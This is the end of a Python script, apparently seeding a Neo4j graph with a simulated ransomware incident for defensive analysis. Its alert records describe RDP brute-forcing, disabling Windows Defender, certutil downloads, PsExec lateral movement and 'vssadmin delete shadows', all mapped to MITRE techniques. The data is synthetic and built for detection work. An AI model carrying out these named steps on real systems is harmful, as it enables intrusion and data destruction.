        MATCH (p:Process {id: 'proc_lockbit_db'}), (ioc:IOC {id: 'ioc_ransom_hash'})
        CREATE (p)-[:MATCHES_IOC]->(ioc)
    """)

    # ── Alerts (Scenario B) ──
    alerts_b = [
        {"id": "alert_rdp_brute", "name": "RDP Brute-Force Detected",
         "severity": "high", "source": "NDR",
         "description": "1200+ failed RDP login attempts from 45.134.26.77 to WEB01",
         "timestamp": "2024-12-01T03:30:00Z", "status": "open",
         "host_id": "WEB01", "technique_id": "T1110.001"},
        {"id": "alert_rdp_success", "name": "Successful RDP Login After Brute-Force",
         "severity": "critical", "source": "SIEM",
         "description": "User asmith logged in via RDP from attacker IP 45.134.26.77",
         "timestamp": "2024-12-01T04:12:05Z", "status": "open",
         "host_id": "WEB01", "technique_id": "T1078"},
        {"id": "alert_av_disabled", "name": "Windows Defender Disabled",
         "severity": "high", "source": "EDR",
         "description": "Real-time protection disabled via PowerShell",
         "timestamp": "2024-12-01T04:15:05Z", "status": "open",
         "host_id": "WEB01", "technique_id": "T1059.001"},
        {"id": "alert_certutil", "name": "Certutil Used for File Download",
         "severity": "high", "source": "EDR",
         "description": "certutil.exe downloaded executable from external IP",
         "timestamp": "2024-12-01T04:18:10Z", "status": "open",
         "host_id": "WEB01", "technique_id": "T1059.003"},
        {"id": "alert_lat_mov_db", "name": "Lateral Movement to Database Server",
         "severity": "critical", "source": "EDR",
         "description": "PsExec used to deploy executable to DB01",
         "timestamp": "2024-12-01T04:30:10Z", "status": "open",
         "host_id": "DB01", "technique_id": "T1021.002"},
        {"id": "alert_shadow_del", "name": "Volume Shadow Copy Deletion",
         "severity": "critical", "source": "EDR",
         "description": "vssadmin delete shadows — ransomware recovery prevention",
         "timestamp": "2024-12-02T00:00:05Z", "status": "open",
         "host_id": "WEB01", "technique_id": "T1490"},
        {"id": "alert_ransomware", "name": "Ransomware Encryption Activity Detected",
         "severity": "critical", "source": "EDR",
         "description": "Mass file encryption detected — LockBit 3.0 behavior",
         "timestamp": "2024-12-02T00:02:00Z", "status": "open",
         "host_id": "WEB01", "technique_id": "T1486"},
        {"id": "alert_ransomware_db", "name": "Ransomware Encryption on DB Server",
         "severity": "critical", "source": "EDR",
         "description": "Mass file encryption detected on DB01",
         "timestamp": "2024-12-02T00:06:00Z", "status": "open",
         "host_id": "DB01", "technique_id": "T1486"},
    ]
    for a in alerts_b:
        session.run(
            "CREATE (a:Alert {id: $id, name: $name, severity: $severity, source: $source, "
            "description: $description, timestamp: $timestamp, status: $status})",
            **{k: v for k, v in a.items() if k not in ("host_id", "technique_id")},
        )
        session.run(
            "MATCH (a:Alert {id: $aid}), (h:Host {id: $hid}) "
            "CREATE (h)-[:TRIGGERED {timestamp: $ts}]->(a)",
            aid=a["id"], hid=a["host_id"], ts=a["timestamp"],
        )
        session.run(
            "MATCH (a:Alert {id: $aid}), (t:MITRE_Technique {id: $tid}) "
            "CREATE (a)-[:MAPS_TO]->(t)",
            aid=a["id"], tid=a["technique_id"],
        )
    print(f"   📌 Created {len(alerts_b)} alerts for Scenario B.")

    # ── Host-to-Host lateral movement edges ──
    session.run("""
        MATCH (a:Host {id: 'WKS01'}), (b:Host {id: 'DC01'})
        CREATE (a)-[:CONNECTED_TO {method: 'PsExec/SMB', timestamp: '2024-11-15T11:05:00Z'}]->(b)
    """)
    session.run("""
        MATCH (a:Host {id: 'DC01'}), (b:Host {id: 'FS01'})
        CREATE (a)-[:CONNECTED_TO {method: 'Admin Share', timestamp: '2024-11-15T14:00:00Z'}]->(b)
    """)
    session.run("""
        MATCH (a:Host {id: 'WEB01'}), (b:Host {id: 'DB01'})
        CREATE (a)-[:CONNECTED_TO {method: 'PsExec/SMB', timestamp: '2024-12-01T04:30:00Z'}]->(b)
    """)

    # ── Final stats ──
    result = session.run("MATCH (n) RETURN labels(n)[0] AS label, count(n) AS count ORDER BY count DESC")
    print("\n📊 Final Graph Statistics:")
    for record in result:
        print(f"   {record['label']:25s} {record['count']}")

    result = session.run("MATCH ()-[r]->() RETURN type(r) AS type, count(r) AS count ORDER BY count DESC")
    print("\n🔗 Relationship Statistics:")
    for record in result:
        print(f"   {record['type']:25s} {record['count']}")


if __name__ == "__main__":
    driver = GraphDatabase.driver(URI, auth=(USER, PASSWORD))
    print("🔌 Connecting to Neo4j...")
    with driver.session() as session:
        seed(session)
    driver.close()
    print("\n✅ Done! Open http://localhost:7474 to explore the graph.")
